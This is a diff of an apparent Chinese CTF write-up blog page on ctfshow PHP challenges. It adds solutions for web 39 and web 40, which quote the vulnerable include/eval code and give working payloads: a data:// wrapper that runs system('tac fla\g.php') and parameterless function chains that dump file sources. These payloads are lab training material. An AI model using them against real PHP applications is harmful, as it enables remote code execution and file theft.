@@ -485,21 +485,21 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-check fa-fw"></i>更新日期:&nbsp;&nbsp;
-                    2022-12-22
+                    2022-12-23
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    4.1k
+                    4.3k
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
-                    17 分
+                    18 分
                 </div>
                 
 
@@ -784,6 +784,33 @@ if(isset($_GET[&#39;c&#39;]))&#123;
 
 $flag&#x3D;&quot;ctfshow&#123;851f27f8-5f9c-4a6a-8967-62035048fec0&#125;&quot;;
 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<h3 id="web-39"><a href="#web-39" class="headerlink" title="web 39"></a>web 39</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php"> &lt;?php
+&#x2F;&#x2F;flag in flag.php
+error_reporting(0);
+if(isset($_GET[&#39;c&#39;]))&#123;
+    $c &#x3D; $_GET[&#39;c&#39;];
+    if(!preg_match(&quot;&#x2F;flag&#x2F;i&quot;, $c))&#123;   &#x2F;&#x2F;过滤flag
+        include($c.&quot;.php&quot;);   &#x2F;&#x2F;添加后缀.php，无回显
+    &#125;
+        
+&#125;else&#123;
+    highlight_file(__FILE__);
+&#125; <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>过滤了flag，采用文件包含的方式，利用data伪协议：传入**?c&#x3D;data:&#x2F;&#x2F;text&#x2F;plain,<?= system("tac fla\g.php");?>**<br>得到flag。</p>
+<h3 id="web-40"><a href="#web-40" class="headerlink" title="web 40"></a>web 40</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php">&lt;?php
+
+if(isset($_GET[&#39;c&#39;]))&#123;
+    $c &#x3D; $_GET[&#39;c&#39;];
+    if(!preg_match(&quot;&#x2F;[0-9]|\~|\&#96;|\@|\#|\\$|\%|\^|\&amp;|\*|\（|\）|\-|\&#x3D;|\+|\&#123;|\[|\]|\&#125;|\:|\&#39;|\&quot;|\,|\&lt;|\.|\&gt;|\&#x2F;|\?|\\\\&#x2F;i&quot;, $c))&#123;
+        eval($c);
+    &#125;
+        
+&#125;else&#123;
+    highlight_file(__FILE__);
+&#125; <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>过滤了冒号，不能用伪协议了，没有过滤英文状态的**()** 和**;**可以试试用无参函数:<br><em><strong>c&#x3D;show_source(next(array_reverse(scandir(pos(localeconv())))));</strong></em></p>
+<p><em><strong>c&#x3D;highlight_file(next(array_reverse(scandir(dirname(FILE)))));</strong></em><br><strong>show_source</strong> 与 <strong>highlight_file</strong> 可以互换。<br>得到flag。</p>
 
                 
             </div>
@@ -1635,7 +1662,7 @@ code[class*="language-"], pre[class*="language-"] { white-space: pre !important;
             <br>
             
             &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
-                class="white-color">7.9k</span>&nbsp;字
+                class="white-color">8k</span>&nbsp;字
             
             
             
